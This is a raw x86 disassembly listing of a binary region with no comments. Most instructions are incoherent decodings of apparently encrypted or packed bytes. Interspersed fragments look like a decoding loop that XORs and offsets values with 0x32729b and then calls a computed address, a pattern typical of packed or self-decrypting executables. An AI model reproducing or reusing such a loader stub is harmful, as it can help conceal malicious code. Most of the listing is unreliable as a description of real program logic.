  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rol    DWORD PTR [ebx*4-0x7debbdf2],cl
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	mov    esp,0xdf4fae60
  40c457:	cmp    edx,DWORD PTR [ecx+ebp*8-0x406b3a80]
  40c45e:	xor    bl,BYTE PTR [edx]
  40c460:	ins    BYTE PTR es:[edi],dx
  40c461:	cmp    edx,eax
  40c463:	repnz add ch,BYTE PTR [ecx-0x61]
  40c467:	jne    0x40c48b
  40c469:	mov    ebx,0x489c4308
  40c46e:	adc    DWORD PTR [ecx+0x50],ebp
  40c471:	mul    BYTE PTR [ebx+0x3a5e7b39]
  40c477:	jp     0x40c412
  40c479:	cli    
  40c47a:	out    dx,al
  40c47b:	mov    ecx,0x3a7f5c8e
  40c480:	leave  
  40c481:	(bad)  [edi]
  40c483:	push   ds
  40c484:	or     dh,bh
  40c486:	push   esi
  40c487:	fst    DWORD PTR [ecx+0x2468ffed]
  40c48d:	mov    ecx,0xb114714f
  40c492:	ret    0x2052
  40c495:	sub    eax,0x988f7242
  40c49a:	(bad)  
  40c49b:	in     eax,0xe
  40c49d:	and    eax,0x5f3e31ee
  40c4a2:	ret    0xd4d
  40c4a5:	cdq    
  40c4a6:	ja     0x40c476
  40c4a8:	jle    0x40c4ab
  40c4aa:	pop    ebx
  40c4ab:	pop    es
  40c4ac:	mov    ds:0x5846e07b,al
  40c4b1:	inc    esp
  40c4b2:	mov    eax,0x1cb5a18b
  40c4b7:	push   cs
  40c4b8:	clc    
  40c4b9:	mov    ds:0x73b4da60,eax
  40c4be:	mov    ebx,0xcaa2a584
  40c4c3:	xchg   ecx,eax
  40c4c4:	mov    eax,ds:0x46453f71
  40c4c9:	push   cs
  40c4ca:	pop    es
  40c4cb:	mov    bl,bl
  40c4cd:	and    bl,dl
  40c4cf:	ds call 0x2d54:0x21e0d376
  40c4d7:	xchg   esp,eax
  40c4d8:	and    al,0xb1
  40c4da:	sub    BYTE PTR gs:[edi+esi*1-0x1b],bl
  40c4df:	out    dx,eax
  40c4e0:	xor    ah,BYTE PTR [esi-0x74]
  40c4e3:	jle    0x40c4ce
  40c4e5:	jmp    0x7a87432
  40c4ea:	sub    edx,DWORD PTR [edx-0x29ba523e]
  40c4f0:	sbb    BYTE PTR [eax-0x64],0xb5
  40c4f4:	jb     0x40c525
  40c4f6:	inc    DWORD PTR [ebx]
  40c4f8:	in     eax,0x81
  40c4fa:	sbb    BYTE PTR [esi],0xdf
  40c4fd:	outs   dx,BYTE PTR ds:[esi]
  40c4fe:	jbe    0x40c4d9
  40c500:	dec    ebp
  40c501:	out    0x70,al
  40c503:	dec    ebp
  40c504:	rcr    DWORD PTR [eax+0x23],0xda
  40c508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c509:	xor    al,0x6c
  40c50b:	xchg   BYTE PTR ds:0xc4aa78ce,bl
  40c511:	test   BYTE PTR [eax],0xaf
  40c514:	inc    eax
  40c515:	pop    ebp
  40c516:	int    0x75
  40c518:	push   0x47
  40c51a:	xchg   edx,eax
  40c51b:	xor    bh,ah
  40c51d:	push   0x7c61797
  40c522:	xor    bl,BYTE PTR [edi]
  40c524:	cld    
  40c525:	std    
  40c526:	lds    esi,FWORD PTR [ebx+ebp*1]
  40c529:	test   al,0x75
  40c52b:	xchg   BYTE PTR [esp+ecx*4+0x6bca4245],bh
  40c532:	hlt    
  40c533:	bound  eax,QWORD PTR fs:[eax-0x54]
  40c537:	jo     0x40c4c4
  40c539:	cld    
  40c53a:	jp     0x40c4ff
  40c53c:	pop    esp
  40c53d:	lea    ebx,[eax-0x19]
  40c540:	enter  0xe4ac,0xf3
  40c544:	mov    eax,0x7ccc68b7
  40c549:	inc    esp
  40c54a:	pop    esp
  40c54b:	rol    ah,cl
  40c54d:	push   ecx
  40c54e:	test   eax,0xc98a1a24
  40c553:	jp     0x40c5a1
  40c555:	cmp    al,0x78
  40c557:	adc    BYTE PTR [esi],dl
  40c559:	add    al,0x4
  40c55b:	push   ebx
  40c55c:	outs   dx,DWORD PTR ds:[esi]
  40c55d:	aaa    
  40c55e:	pushf  
  40c55f:	fwait
  40c560:	sbb    eax,0xbff6c190
  40c565:	sbb    eax,0x37d05716
  40c56a:	in     al,0xa1
  40c56c:	push   0x7c0d09
  40c571:	mov    dl,ch
  40c573:	mov    edi,0x52ef507f
  40c578:	jmp    0x40c532
  40c57a:	das    
  40c57b:	add    ch,ah
  40c57d:	jb     0x40c5f1
  40c57f:	sbb    DWORD PTR [eax],esp
  40c581:	mov    al,0x83
  40c583:	push   ss
  40c584:	add    DWORD PTR [eax+ebx*1-0x4c9f3682],ebp
  40c58b:	into   
  40c58c:	out    0x2b,al
  40c58e:	jle    0x40c5ac
  40c590:	out    0x52,eax
  40c592:	aam    0xb6
  40c594:	add    al,BYTE PTR [ebx+0x6ceb28ae]
  40c59a:	(bad)  
  40c59b:	push   edx
  40c59c:	and    dh,BYTE PTR [esi-0x19]
  40c59f:	push   edx
  40c5a0:	sub    esi,ebx
  40c5a2:	cmp    ebx,DWORD PTR ds:0x1265bf4a
  40c5a8:	sbb    esi,DWORD PTR [esp+eax*2+0x1e]
  40c5ac:	les    ebp,FWORD PTR es:[ecx+0x3f]
  40c5b0:	mov    bl,0x1d
  40c5b2:	sub    esp,DWORD PTR [esi]
  40c5b4:	aaa    
  40c5b5:	dec    ebx
  40c5b6:	push   0x57
  40c5b8:	pop    ecx
  40c5b9:	stc    
  40c5ba:	rol    DWORD PTR [ebx],0x11
  40c5bd:	cs test al,0x52
  40c5c0:	or     bh,BYTE PTR [edi-0x75466d94]
  40c5c6:	or     BYTE PTR [edx-0x166a6038],0x81
  40c5cd:	and    DWORD PTR [eax+0x1ba16967],ecx
  40c5d3:	jb     0x40c603
  40c5d5:	or     edx,DWORD PTR [esi]
  40c5d7:	(bad)  
  40c5d8:	sti    
  40c5d9:	mov    ds:0xc2bc902e,al
  40c5de:	push   cs
  40c5df:	(bad)  
  40c5e0:	std    
  40c5e1:	or     edx,DWORD PTR [ebx]
  40c5e3:	xchg   BYTE PTR [ecx+0x66127efa],dh
  40c5e9:	imul   edx,DWORD PTR ds:0xb89fd13d,0xb2bd49a
  40c5f3:	xchg   DWORD PTR [ebx+0x11ab39f],edi
  40c5f9:	leave  
  40c5fa:	pop    ss
  40c5fb:	xor    al,0x35
  40c5fd:	cmp    esp,DWORD PTR [edi-0x46319f72]
  40c603:	inc    esp
  40c604:	sub    edi,DWORD PTR [eax+0x10]
  40c607:	cmp    DWORD PTR [ebx+0x2e],ebp
  40c60a:	scas   al,BYTE PTR es:[edi]
  40c60b:	rol    cl,1
  40c60d:	jge    0x40c63a
  40c60f:	into   
  40c610:	retf   0xd8a4
  40c613:	xchg   cl,bh
  40c615:	add    bl,BYTE PTR [edi+0x13050d4f]
  40c61b:	icebp  
  40c61c:	dec    esi
  40c61d:	mov    ebp,0x2b4be529
  40c622:	into   
  40c623:	daa    
  40c624:	popa   
  40c625:	ret    0x15fb
  40c628:	(bad)
  40c62b:	jl     0x40c5de
  40c62d:	inc    eax
  40c62e:	out    dx,eax
  40c62f:	sti    
  40c630:	xchg   edi,eax
  40c631:	mov    ecx,0xbbebab9b
  40c636:	push   eax
  40c637:	dec    esi
  40c638:	or     bh,BYTE PTR [edi]
  40c63a:	frstor [esi]
  40c63c:	inc    edi
  40c63d:	xor    eax,0x2a27be26
  40c642:	popf   
  40c643:	test   DWORD PTR [eax+0x1f],0x63e2b930
  40c64a:	sub    al,0xe7
  40c64c:	lock fbstp TBYTE PTR [eax]
  40c64f:	cld    
  40c650:	push   ecx
  40c651:	mov    al,ds:0x8a46c15f
  40c656:	jno    0x40c68b
  40c658:	add    eax,0x7a96ca89
  40c65d:	ins    BYTE PTR es:[edi],dx
  40c65e:	popf   
  40c65f:	clc    
  40c660:	out    dx,eax
  40c661:	int    0x32
  40c663:	sbb    DWORD PTR [ecx],ebx
  40c665:	shl    DWORD PTR [ebp-0x3e],0x79
  40c669:	xchg   esp,eax
  40c66a:	push   0xc2ecb5e8
  40c66f:	or     BYTE PTR [eax],0xd5
  40c672:	loope  0x40c6dd
  40c674:	xor    DWORD PTR [ecx],0x54db83b0
  40c67a:	fadd   QWORD PTR fs:[edi-0x69]
  40c67e:	mov    al,ds:0x69758bc9
  40c683:	add    eax,ebp
  40c685:	shr    DWORD PTR [ebp+0x7f0ee07a],0xf9
  40c68c:	and    esp,DWORD PTR ss:[ecx+0x25ee0350]
  40c693:	dec    edi
  40c694:	stos   BYTE PTR es:[edi],al
  40c695:	(bad)  
  40c697:	fstp   TBYTE PTR [esi+0x32729b]
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x47be653f],dl
  40c6de:	push   esp
  40c6df:	fcmovu st,st(6)
  40c6e1:	cmp    BYTE PTR [esi+0x7e],0x38
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c691
  40c6e9:	leave  
  40c6ea:	in     eax,0xb2
  40c6ec:	pop    ds
  40c6ed:	mov    eax,ds:0x7e4c9c1b
  40c6f2:	xor    ch,BYTE PTR [edi]
  40c6f4:	ja     0x40c69f
  40c6f6:	xor    eax,ebp
  40c6f8:	dec    esi
  40c6f9:	or     ebp,DWORD PTR [edx-0x79]
  40c6fc:	inc    BYTE PTR [ecx+0x5a]
  40c6ff:	dec    ecx
  40c700:	pop    ebx
  40c701:	cmc    
  40c702:	int    0xb2
  40c704:	sahf   
  40c705:	or     eax,0x3c99f09b
  40c70a:	pop    ebp
  40c70b:	ret    0x978c
  40c70e:	rol    BYTE PTR [edi+0x57df774],cl
  40c714:	push   ecx
  40c715:	push   es
  40c716:	xchg   ebp,eax
  40c717:	adc    al,BYTE PTR [edi-0x3c]
  40c71a:	mov    edx,0x5df888ba
  40c71f:	push   edi
  40c720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c721:	and    al,0x60
  40c723:	inc    ebp
  40c724:	mov    ah,0x4f
  40c726:	lds    esp,FWORD PTR [ecx-0x2cdd2baf]
  40c72c:	into   
  40c72d:	inc    ebx
  40c72e:	jne    0x40c711
  40c730:	mov    ah,0x4
  40c732:	adc    al,0x86
  40c734:	push   cs
  40c735:	mov    ebx,esp
  40c737:	out    0xb1,eax
  40c739:	xor    DWORD PTR ds:0xa0a6421c,0xfb76ad3c
  40c743:	fwait
  40c744:	pop    esi
  40c745:	lods   al,BYTE PTR ds:[esi]
  40c746:	retf   
  40c747:	imul   edi
  40c749:	xchg   BYTE PTR [ebx],bh
  40c74b:	(bad)  
  40c74c:	jge    0x40c742
  40c74e:	daa    
  40c74f:	repnz (bad) 
  40c752:	inc    esp
  40c753:	hlt    
  40c754:	inc    edi
  40c755:	fimul  WORD PTR [ebx+0x1c]
  40c758:	inc    esi
  40c759:	je     0x40c72f
  40c75b:	rcr    DWORD PTR [ecx+ebp*8+0x1],0x75
  40c760:	mov    eax,ds:0x5d6a5762
  40c765:	iret   
  40c766:	imul   eax,DWORD PTR [eax],0x27
  40c769:	cmp    BYTE PTR [edx-0x2e],dh
  40c76c:	stos   DWORD PTR es:[edi],eax
  40c76d:	dec    edi
  40c76e:	(bad)  [esi-0x5ff096cc]
  40c774:	mov    edi,0x90f16e6b
  40c779:	lock xor dh,bh
  40c77c:	pusha  
  40c77d:	stos   BYTE PTR es:[edi],al
  40c77e:	lea    esi,[ebx]
  40c780:	jg     0x40c70c
  40c782:	cs xchg edx,eax
  40c784:	(bad)  
  40c785:	(bad)  
  40c786:	cmp    esp,DWORD PTR [edx]
  40c788:	mov    bl,0xd8
  40c78a:	mov    ds:0xa5126387,al
  40c78f:	sub    DWORD PTR [esi+edi*4+0x6f],esi
  40c793:	das    
  40c794:	inc    esi
  40c795:	mov    ah,BYTE PTR [eax-0x1e]
  40c798:	push   ecx
  40c799:	xchg   ebp,eax
  40c79a:	push   0xdaaf410b
  40c79f:	push   ds
  40c7a0:	leave  
  40c7a1:	cmp    al,0x7b
  40c7a3:	xlat   BYTE PTR ds:[ebx]
  40c7a4:	inc    edx
  40c7a5:	xor    BYTE PTR [ebx-0x22fe0969],0xd8
  40c7ac:	xchg   edx,eax
  40c7ad:	mov    esi,0x8e3d6fb1
  40c7b2:	fsubr  QWORD PTR ds:0xfdaf4b41
  40c7b8:	repnz cmp ebx,ecx
  40c7bb:	mov    ds:0xe9ec3956,eax
  40c7c0:	mov    WORD PTR [ecx+0x230a7f41],es
  40c7c6:	stos   BYTE PTR es:[edi],al
  40c7c7:	pop    es
  40c7c8:	enter  0x15d2,0x3c
  40c7cc:	and    eax,0xa11e03f5
  40c7d1:	or     eax,0x5367ecde
  40c7d6:	adc    eax,ecx
  40c7d8:	mov    ecx,0xb39deb3f
  40c7dd:	repz je 0x40c7e5
  40c7e0:	addr16 mov bh,0x77
  40c7e3:	and    al,BYTE PTR [edi]
  40c7e5:	cli    
  40c7e6:	adc    DWORD PTR [edi+0x60],esp
  40c7e9:	lea    ebx,[eax+0x6dbad47]
  40c7ef:	mov    dl,BYTE PTR [edx]
  40c7f1:	jnp    0x40c7af
  40c7f3:	adc    edx,0x4c
  40c7f6:	shl    DWORD PTR [edx+eiz*2-0x8],cl
  40c7fa:	fld    DWORD PTR [ebx]
  40c7fc:	xchg   ecx,eax
  40c7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7fe:	pop    edi
  40c7ff:	mov    ah,0x3b
  40c801:	cmp    DWORD PTR [edi+0x9],edx
  40c804:	xchg   ebp,eax
  40c805:	jo     0x40c796
  40c807:	mov    DWORD PTR [eax-0x555b22c1],edx
  40c80d:	push   esi
  40c80e:	and    BYTE PTR [edx],bh
  40c810:	push   0xffffffad
  40c812:	xchg   edi,eax
  40c813:	in     eax,dx
  40c814:	(bad)  
  40c815:	sub    al,0x1a
  40c817:	push   esi
  40c818:	jmp    0x39c:0x632b5d46
  40c81f:	sbb    edx,DWORD PTR [eax+0x79]
  40c822:	pop    ebp
  40c823:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40c825:	pop    es
  40c826:	in     al,0x90
  40c828:	arpl   WORD PTR ds:0xc3d606c0,bx
  40c82e:	mov    al,ds:0xc20bd960
  40c833:	out    dx,al
  40c834:	xchg   DWORD PTR [edi],ecx
  40c836:	and    cl,BYTE PTR [ecx]
  40c838:	ror    BYTE PTR [ebp-0x7cf2dd7b],1
  40c83e:	sbb    ebx,DWORD PTR ds:0x93aa8591
  40c844:	stos   DWORD PTR es:[edi],eax
  40c845:	adc    dl,BYTE PTR [ecx-0x2d]
  40c848:	mov    al,ss:0x6dbec351
  40c84e:	rcl    DWORD PTR [ebx-0x43],cl
  40c851:	out    0x72,al
  40c853:	jmp    0x5849f6be
  40c858:	jecxz  0x40c82b
  40c85a:	xchg   ch,bl
  40c85c:	dec    esp
  40c85d:	test   al,0xbb
  40c85f:	and    eax,0x72586c75
  40c864:	jnp    0x40c843
  40c866:	jecxz  0x40c816
  40c868:	cdq    
  40c869:	std    
  40c86a:	mov    DWORD PTR [esi+0x6c],ecx
  40c86d:	cli    
  40c86e:	inc    ecx
  40c86f:	adc    al,0x5
  40c871:	shr    BYTE PTR [esi-0x49],0xaa
  40c875:	push   eax
  40c876:	push   esi
  40c877:	cmp    al,0x23
  40c879:	loope  0x40c899
  40c87b:	jne    0x40c8f8
  40c87d:	sub    eax,0x9442ce39
  40c882:	mov    DWORD PTR [eax-0x3c],ebx
  40c885:	pop    ds
  40c886:	stc    
  40c887:	add    BYTE PTR [ecx+edi*2],dh
  40c88a:	jecxz  0x40c8a4
  40c88c:	jno    0x40c878
  40c88e:	and    eax,0xd568f517
  40c893:	mov    bh,0x64
  40c895:	gs push ds
  40c897:	jb     0x40c82e
  40c899:	xor    eax,0xe4e5a4c1
  40c89e:	arpl   dx,sp
  40c8a0:	inc    BYTE PTR [ecx-0x63]
  40c8a3:	popa   
  40c8a4:	sbb    BYTE PTR [ebx-0x662c8b76],ch
  40c8aa:	ins    DWORD PTR es:[edi],dx
  40c8ab:	push   ebx
  40c8ac:	and    al,0xaa
  40c8ae:	ins    BYTE PTR es:[edi],dx
  40c8af:	test   ebp,0xe7972c86
  40c8b5:	pop    esi
  40c8b6:	repz mov ds:0xadb23a24,al
  40c8bc:	xor    bh,BYTE PTR [ebx+0x0]
  40c8bf:	in     al,0xa0
  40c8c1:	(bad)  
  40c8c2:	scas   al,BYTE PTR es:[edi]
  40c8c3:	jns    0x40c885
  40c8c5:	jge    0x40c8d9
  40c8c7:	out    dx,eax
  40c8c8:	jmp    0x40c930
  40c8ca:	cmp    BYTE PTR [ebp-0x418395c9],0x6b
  40c8d1:	sub    BYTE PTR [esi+edi*8],0xab
  40c8d5:	popf   
  40c8d6:	add    eax,0x63ef7cfd
  40c8db:	sub    edx,esi
  40c8dd:	adc    al,0xfc
  40c8df:	and    bh,BYTE PTR [ebx-0x3d]
  40c8e2:	sub    bh,bh
  40c8e4:	adc    al,BYTE PTR [ecx]
  40c8e6:	dec    ebx
  40c8e7:	inc    ecx
  40c8e8:	fcomp  DWORD PTR [eax]
  40c8ea:	mov    ch,0x56
  40c8ec:	shr    BYTE PTR [ebx+esi*1+0x38],0x35
  40c8f1:	dec    esp
  40c8f2:	std    
  40c8f3:	hlt    
  40c8f4:	cld    
  40c8f5:	mov    DWORD PTR [ebp-0x6d],ecx
  40c8f8:	je     0x40c906
  40c8fa:	sbb    eax,0x8691d846
  40c8ff:	test   al,0xcc
  40c901:	mov    ds:0x514eb608,eax
  40c906:	fsin   
  40c908:	lock test eax,0x77217f55
  40c90e:	adc    eax,0x340fbb28
  40c913:	scas   eax,DWORD PTR es:[edi]
  40c914:	out    0x9e,al
  40c916:	pop    ss
  40c917:	(bad)  
  40c918:	int    0xb3
  40c91a:	adc    BYTE PTR [esi+0x65],bl
  40c91d:	sub    eax,0xa7b919c6
  40c922:	cli    
  40c923:	jle    0x40c8f1
  40c925:	repnz add BYTE PTR [esi],dl
  40c928:	cmp    al,0x5c
  40c92a:	addr16 clc 
  40c92c:	sub    ebp,eax
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [eax-0x1a],ebx
  40c946:	cli    
  40c947:	stos   DWORD PTR es:[edi],eax
  40c948:	cwde   
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	push   ecx
  40c951:	ins    DWORD PTR es:[edi],dx
  40c952:	loop   0x40c923
  40c954:	jle    0x40c8ff
  40c956:	iret   
  40c957:	call   0xe53a:0x9bd003f2
  40c95e:	mov    WORD PTR [eax+0x630e0125],gs
  40c964:	xchg   edi,eax
  40c965:	cwde   
  40c966:	or     BYTE PTR [edi+0x75f81105],ah
  40c96c:	pusha  
  40c96d:	call   0x29e9:0x2e00662c
  40c974:	leave  
  40c975:	sub    eax,0xec065d74
  40c97a:	pop    esp
  40c97b:	adc    DWORD PTR [ebp+0x4b30e819],ebp
  40c981:	das    
  40c982:	mov    edx,0xd864c4d5
  40c987:	call   0xe28a:0xb7ce6165
  40c98e:	outs   dx,DWORD PTR cs:[esi]
  40c990:	or     DWORD PTR [eax+eiz*2+0x59a26ead],esi
  40c997:	cld    
  40c998:	test   ebx,eax
  40c99a:	inc    esi
  40c99b:	icebp  
  40c99c:	je     0x40ca00
  40c99e:	stos   DWORD PTR es:[edi],eax
  40c99f:	pop    ecx
  40c9a0:	or     eax,0x6835696f
  40c9a5:	int    0x6d
  40c9a7:	rol    ch,cl
  40c9a9:	and    DWORD PTR [edx],ebx
  40c9ab:	xchg   esp,eax
  40c9ac:	sub    BYTE PTR [edi+ecx*1+0x76],0xb6
  40c9b1:	dec    edx
  40c9b2:	cwde   
  40c9b3:	or     ax,0x9e60
  40c9b7:	(bad)  
  40c9b8:	pop    esp
  40c9b9:	xor    BYTE PTR [eax-0x7c20db00],al
  40c9bf:	inc    eax
  40c9c0:	jmp    0xc8af:0xe40e762d
  40c9c7:	and    edx,DWORD PTR [ecx+0x995424f]
  40c9cd:	fstp   st(0)
  40c9cf:	mov    ebx,0xda34345
  40c9d4:	pop    esi
  40c9d5:	dec    ecx
  40c9d6:	stos   BYTE PTR es:[edi],al
  40c9d7:	out    0x59,eax
  40c9d9:	sar    esi,0xdb
  40c9dc:	xchg   BYTE PTR [ebp+0x1d],al
  40c9df:	es hlt 
  40c9e1:	into   
  40c9e2:	xchg   ebx,eax
  40c9e3:	sbb    al,bh
  40c9e5:	in     eax,0x1
  40c9e7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40c9e9:	int3   
  40c9ea:	adc    al,0xc4
  40c9ec:	mov    dh,BYTE PTR [eax]
  40c9ee:	enter  0xd1f4,0x2a
  40c9f2:	xlat   BYTE PTR ds:[ebx]
  40c9f3:	dec    esi
  40c9f4:	jl     0x40c9b5
  40c9f6:	fist   WORD PTR [ebp-0x70]
  40c9f9:	xchg   ebx,eax
  40c9fa:	imul   edx,DWORD PTR [edi+0x24f1a5e3],0xffffff80
  40ca01:	repnz or al,0xa1
  40ca04:	aas    
  40ca05:	dec    eax
  40ca06:	dec    edi
  40ca07:	cdq    
  40ca08:	adc    DWORD PTR [eax+0x45],eax
  40ca0b:	pushf  
  40ca0c:	or     DWORD PTR [esi+0xe],esp
  40ca0f:	int    0x30
  40ca11:	xor    edi,DWORD PTR ds:0x9e51dc8
  40ca17:	cmp    eax,0x6d80f8c5
  40ca1c:	test   ecx,esp
  40ca1e:	push   eax
  40ca1f:	jno    0x40ca0c
  40ca21:	sbb    ecx,ecx
  40ca23:	mov    ebp,0x875da54
  40ca28:	mov    ebp,0x568da4bf
  40ca2d:	mov    ebx,0x8e507577
  40ca32:	jnp    0x40cab1
  40ca34:	idiv   DWORD PTR [edx]
  40ca36:	jge    0x40c9cd
  40ca38:	ds mov ebx,0xbed043bd
  40ca3e:	mov    ah,0xb
  40ca40:	sar    BYTE PTR [eax-0x5e],cl
  40ca43:	outs   dx,DWORD PTR ds:[esi]
  40ca44:	sbb    dl,BYTE PTR [edi+0x1f]
  40ca47:	popa   
  40ca48:	cli    
  40ca49:	jle    0x40c9ea
  40ca4b:	push   ebp
  40ca4c:	gs xchg BYTE PTR es:[ebx+0x18],cl
  40ca51:	(bad)  
  40ca52:	shr    BYTE PTR [ebx],1
  40ca54:	xchg   edx,eax
  40ca55:	adc    BYTE PTR [eax+0x4976ac79],ch
  40ca5b:	jo     0x40ca3e
  40ca5d:	push   edi
  40ca5e:	loop   0x40ca5f
  40ca60:	and    DWORD PTR [ecx-0x75],ebp
  40ca63:	adc    DWORD PTR [edx-0x12adbf17],0x17192907
  40ca6d:	sti    
  40ca6e:	jge    0x40ca61
  40ca70:	pop    ds
  40ca71:	imul   edx,DWORD PTR [ecx-0x79],0x12a4dc77
  40ca78:	and    dl,BYTE PTR [edi-0x25773996]
  40ca7e:	adc    DWORD PTR [ebx],ebx
  40ca80:	fstp   QWORD PTR [edi+0x6f]
  40ca83:	inc    ebx
  40ca84:	mov    ebp,0xf240ba29
  40ca89:	sbb    BYTE PTR [esi],0x5d
  40ca8c:	push   ebp
  40ca8d:	push   cs
  40ca8e:	xor    eax,DWORD PTR [edi]
  40ca90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca91:	in     eax,0xd4
  40ca93:	mov    dl,0x7c
  40ca95:	test   eax,0x6b60a087
  40ca9a:	cli    
  40ca9b:	outs   dx,BYTE PTR ds:[esi]
  40ca9c:	sub    BYTE PTR [ebp+0x59],ah
  40ca9f:	call   0x3067:0x17f38238
  40caa6:	les    edi,FWORD PTR [eax-0x7c4113b4]
  40caac:	pop    ebx
  40caad:	xchg   ebx,eax
  40caae:	push   es
  40caaf:	adc    BYTE PTR [eax+0x496e023f],bl
  40cab5:	xor    BYTE PTR [ecx+0x7],0x42
  40cab9:	and    cl,dh
  40cabb:	pushf  
  40cabc:	inc    ecx
  40cabd:	sub    eax,eax
  40cabf:	(bad)  
  40cac0:	cld    
  40cac1:	mov    WORD PTR [edx+0x63054550],ds
  40cac7:	lods   al,BYTE PTR ds:[esi]
  40cac8:	and    bh,BYTE PTR [edx+0x35e9ac7a]
  40cace:	loop   0x40ca8d
  40cad0:	pushf  
  40cad1:	ret    0x32e7
  40cad4:	mov    BYTE PTR [esi-0x1e],0xdb
  40cad8:	int    0x16
  40cada:	int3   
  40cadb:	clc    
  40cadc:	xchg   esi,eax
  40cadd:	cwde   
  40cade:	jmp    0x667469d8
  40cae3:	pop    ds
  40cae4:	popa   
  40cae5:	ret    0x7cc8
  40cae8:	hlt    
  40cae9:	das    
  40caea:	pop    ebx
  40caeb:	std    
  40caec:	data16 outs dx,BYTE PTR ds:[esi]
  40caee:	inc    eax
  40caef:	arpl   WORD PTR ds:0xd8cd018a,si
  40caf5:	jmp    DWORD PTR [ebp-0x7109563d]
  40cafb:	aas    
  40cafc:	sbb    al,0xf7
  40cafe:	jp     0x40cac5
  40cb00:	iret   
  40cb01:	pop    esp
  40cb02:	in     al,0xd2
  40cb04:	or     dh,BYTE PTR [edi+0x73]
  40cb07:	dec    edi
  40cb08:	dec    ebx
  40cb09:	nop
  40cb0a:	hlt    
  40cb0b:	xchg   ebx,eax
  40cb0c:	aaa    
  40cb0d:	jecxz  0x40cb0c
  40cb0f:	adc    DWORD PTR [edi+0x44],0xffffffbe
  40cb13:	sub    al,0x9c
  40cb15:	in     al,0x6b
  40cb17:	pop    ebx
  40cb18:	add    DWORD PTR [bp+di],esp
  40cb1b:	lods   eax,DWORD PTR ds:[esi]
  40cb1c:	sub    al,0xd
  40cb1e:	mov    bh,0x49
  40cb20:	xor    ebx,ebp
  40cb22:	pop    eax
  40cb23:	push   esi
  40cb24:	mov    BYTE PTR [ebp-0x4427c709],bh
  40cb2a:	mov    eax,ds:0x3dd6fd04
  40cb2f:	das    
  40cb30:	int    0xec
  40cb32:	sbb    ch,BYTE PTR [edx]
  40cb34:	mov    bh,0xed
  40cb36:	sti    
  40cb37:	fstp   DWORD PTR [ebx-0x3fcd8822]
  40cb3d:	out    dx,al
  40cb3e:	xor    eax,0xd5d0dd
  40cb43:	and    eax,0x1ba1642
  40cb48:	mov    dh,0x6e
  40cb4a:	(bad)  
  40cb4b:	pop    ss
  40cb4c:	pusha  
  40cb4d:	and    esi,DWORD PTR [ecx+0x567e9e31]
  40cb53:	pop    edx
  40cb54:	iret   
  40cb55:	(bad)  
  40cb56:	lds    edi,FWORD PTR [ecx+0x246f1da1]
  40cb5c:	test   al,0x7c
  40cb5e:	fidiv  DWORD PTR [edx+0x30]
  40cb61:	aad    0xea
  40cb63:	adc    ebp,0xffffffdf
  40cb66:	loopne 0x40cbae
  40cb68:	sbb    bl,BYTE PTR [edi]
  40cb6a:	popf   
  40cb6b:	adc    edx,DWORD PTR [edi]
  40cb6d:	or     ebx,DWORD PTR [eax-0x6f9b3a8]
  40cb73:	and    ch,BYTE PTR [ebx*2-0x755d9f15]
  40cb7a:	repnz test DWORD PTR [ebx+0x8],esp
  40cb7e:	mov    eax,DWORD PTR [esi-0x73]
  40cb81:	sub    eax,DWORD PTR [ebp+0x250f6565]
  40cb87:	inc    ecx
  40cb88:	cli    
  40cb89:	push   es
  40cb8a:	add    cl,dh
  40cb8c:	(bad)  
  40cb8d:	cmp    BYTE PTR [esp+ecx*1],bl
  40cb90:	sub    eax,0x34e5c295
  40cb95:	mov    esp,0xaf0fc603
  40cb9a:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
